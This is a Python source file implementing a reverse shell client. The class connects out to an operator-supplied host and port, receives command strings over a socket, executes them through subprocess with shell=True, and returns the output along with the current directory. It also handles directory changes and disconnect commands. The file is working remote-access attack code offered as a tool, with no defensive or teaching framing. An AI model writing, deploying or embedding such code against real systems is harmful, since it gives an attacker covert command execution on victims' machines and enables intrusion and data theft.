import os
import socket
import shlex
import subprocess
import sys


class ShellClient:
    """Class used to create and control a reverse shell client"""
    def __init__(self, host, port):
        self.host = host
        self.port = port

        self.ENCODING = 'utf-8'
        self.HEADER_LENGTH = 10

        self.client_socket = None

    def _receive_command(self):
        """Parses command data sent from the server"""
        try:
            command_header = self.client_socket.recv(self.HEADER_LENGTH)

            if not command_header:
                return None

            command_length = int(command_header.decode(self.ENCODING).strip())
            command = self.client_socket.recv(command_length)
            command = command.decode(self.ENCODING)

            return command

        except:
            return None

    def _send_response(self, sock, message):
        """Send the output of a client command to the server"""
        # Form the response header
        response_header = f"{len(message): <{self.HEADER_LENGTH}}".encode(self.ENCODING)
        response = message.encode(self.ENCODING)

        # Send of the command data to the client
        sock.send(response_header + response)

    def _exec_command(self, args):
        """Execute a command on the client machine and send the output to the server"""
        command = ' '.join(args)

        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE)

        # Form the byte output
        output = cmd.stdout.read()

        # Convert this into a string
        output = output.decode(self.ENCODING)
        output = output + str(os.getcwd()) + '> '

        # Print output for local testing
        print(output)

        # Send this response to the server
        self._send_response(self.client_socket, output)

    def connect(self):
        try:
            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client_socket.connect((self.host, self.port))

        except ConnectionRefusedError:
            print("\n[!] Server unavailable. Are you sure it is running?\n")
            self.client_socket.close()
            sys.exit()

        # Begin the main client loop
        while True:
            # Now begin receiving commands
            command_stream = self._receive_command()

            # Parse the command stream for arguments
            args = shlex.split(command_stream)

            if not args:
                # Send an empty response
                self._send_response(self.client_socket, '')
                continue

            # Check for built-in commands
            if args[0] == 'cd':
                try:
                    directory = args[1]
                    os.chdir(directory.strip())

                except Exception:
                    print("[-]Could not change directory\n")
                    continue

            elif args[0] == 'remove':
                # Gracefully close the connection
                self.disconnect()
                sys.exit()

            elif args[0] == 'quit':
                # Retain this client connection
                continue

            if command_stream:
                # Valid shell command was entered
                self._exec_command(args)

    def disconnect(self):
        """Gracefully closes client connection to the server"""
        try:
            self.client_socket.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        self.client_socket.close()
